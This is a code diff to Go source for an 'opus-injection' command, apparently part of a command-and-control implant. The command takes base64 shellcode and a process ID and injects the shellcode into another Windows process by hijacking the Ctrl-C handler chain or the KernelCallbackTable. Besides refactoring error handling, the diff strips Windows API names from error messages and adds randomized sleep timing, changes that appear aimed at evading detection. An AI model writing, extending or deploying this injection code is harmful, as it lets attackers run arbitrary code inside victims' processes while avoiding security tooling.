@@ -117,54 +117,30 @@ type OpusInjectionParams struct {
 // Execute executes the opus-injection command
 func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	if runtime.GOOS != "windows" {
-		return structs.CommandResult{
-			Output:    "Error: This command is only supported on Windows",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: This command is only supported on Windows")
 	}
 
 	var params OpusInjectionParams
 	err := json.Unmarshal([]byte(task.Params), &params)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	if params.ShellcodeB64 == "" {
-		return structs.CommandResult{
-			Output:    "Error: No shellcode data provided",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: No shellcode data provided")
 	}
 
 	if params.PID <= 0 {
-		return structs.CommandResult{
-			Output:    "Error: Invalid PID specified",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: Invalid PID specified")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return structs.CommandResult{
-			Output:    "Error: Shellcode data is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: Shellcode data is empty")
 	}
 
 	var output string
@@ -174,26 +150,14 @@ func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult 
 	case 4:
 		output, err = executeOpusVariant4(shellcode, uint32(params.PID))
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: Unsupported variant %d. Currently supported: 1 (Ctrl-C Handler), 4 (KernelCallbackTable)", params.Variant),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: Unsupported variant %d. Currently supported: 1 (Ctrl-C Handler), 4 (KernelCallbackTable)", params.Variant)
 	}
 
 	if err != nil {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("\n[!] Injection failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("\n[!] Injection failed: %v", err))
 	}
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "completed",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 // executeOpusVariant1 implements Ctrl-C Handler Chain Injection
@@ -398,11 +362,11 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 	// Step 7: Allocate + write modified table (RW is fine, no execution needed)
 	remoteTableAddr, err := injectAllocMemory(hProcess, tableSize, PAGE_READWRITE)
 	if err != nil {
-		return sb.String(), fmt.Errorf("VirtualAllocEx for table failed: %v", err)
+		return sb.String(), fmt.Errorf("remote allocation for table failed: %v", err)
 	}
 	_, err = injectWriteMemory(hProcess, remoteTableAddr, modifiedTable)
 	if err != nil {
-		return sb.String(), fmt.Errorf("WriteProcessMemory for table failed: %v", err)
+		return sb.String(), fmt.Errorf("remote write for table failed: %v", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Modified callback table at: 0x%X\n", remoteTableAddr))
 
@@ -438,7 +402,7 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 	}()
 	sb.WriteString("[+] Sent WM_COPYDATA message (async)\n")
 
-	time.Sleep(500 * time.Millisecond)
+	jitterSleep(400*time.Millisecond, 700*time.Millisecond)
 
 	// Step 10: Restore original KernelCallbackTable pointer
 	origPtrBytes := (*[8]byte)(unsafe.Pointer(&kernelCallbackTable))[:]
